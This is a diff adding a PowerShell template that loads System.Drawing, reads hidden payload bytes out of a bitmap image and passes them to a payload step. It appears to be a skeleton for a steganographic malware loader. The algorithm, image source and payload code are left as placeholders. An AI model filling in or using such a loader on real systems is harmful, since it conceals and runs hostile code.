@@ -1,0 +1,14 @@
+[string] $image_source = $args[0]
+[Int32] $byte_length = $args[1]
+
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+
+{{{ ALGORITHM_CODE }}}
+
+$BitMap = {{{ IMAGE_SOURCE_CODE }}}
+
+$payload_data = Read $BitMap $byte_length
+
+{{{ PAYLOAD_CODE }}}
+
+Start-Sleep -s 3
